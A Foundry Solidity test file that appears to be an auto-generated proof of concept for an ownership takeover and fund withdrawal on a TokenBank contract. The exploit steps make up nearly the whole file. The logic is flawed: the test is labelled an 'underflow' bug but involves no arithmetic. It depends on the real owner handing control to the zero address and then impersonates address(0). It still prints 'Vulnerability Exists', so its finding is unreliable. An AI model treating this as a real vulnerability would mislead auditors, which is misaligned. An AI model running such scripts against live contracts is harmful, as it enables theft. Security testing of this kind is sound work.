// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract TokenBankTest is Test {
    TokenBank public tokenBank;
    address owner = makeAddr("owner");
    address zeroAddr = address(0);
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        vm.deal(address(tokenBank), 1 ether);
        vm.stopPrank();
    }

    function test_OwnerUnderflowVulnerability() public {
        // Fund attacker wallet
        vm.deal(attacker, 1 ether);
        
        console2.log("--- BEFORE-Trigger state: ---");
        // Pre-trigger: Query current owner
        address ownerBefore = tokenBank.owner();
        console2.log("Owner address before attack: %s", ownerBefore);

        console2.log("--- Trigger attack steps ---");
        // Transfer owner rights to zero address
        vm.prank(owner);
        tokenBank.changeOwner(zeroAddr);

        // Zero address confirms ownership
        vm.prank(zeroAddr);
        tokenBank.confirmOwner();

        // As new owner (zero address), change owner to attacker
        vm.prank(zeroAddr);
        tokenBank.changeOwner(attacker);

        // Attacker confirms ownership
        vm.prank(attacker);
        tokenBank.confirmOwner();

        console2.log("--- AFTER-Trigger state: ---");
        // Post-trigger: Query current owner
        address ownerAfter = tokenBank.owner();
        console2.log("Owner address after attack: %s", ownerAfter);

        // Compare before and after states
        bool ownershipChanged = (ownerBefore == owner) && (ownerAfter == attacker);
        
        // Optional: Demonstrate impact by withdrawing funds
        if (ownershipChanged) {
            console2.log("Executing impact demonstration: Attacker withdrawal");
            uint256 attackerBalanceBefore = address(attacker).balance;
            vm.prank(attacker);
            tokenBank.WithdrawToHolder(attacker, 0.5 ether);
            uint256 attackerBalanceAfter = address(attacker).balance;
            console2.log("Withdrawal: Attacker received %s wei", attackerBalanceAfter - attackerBalanceBefore);
        }

        // Final vulnerability verdict
        if (ownershipChanged) {
            console2.log("Vulnerability Exists: Ownership successfully changed from original owner to attacker");
        } else {
            console2.log("Vulnerability not Exist: Ownership remains at %s after attack", ownerAfter);
        }
    }
}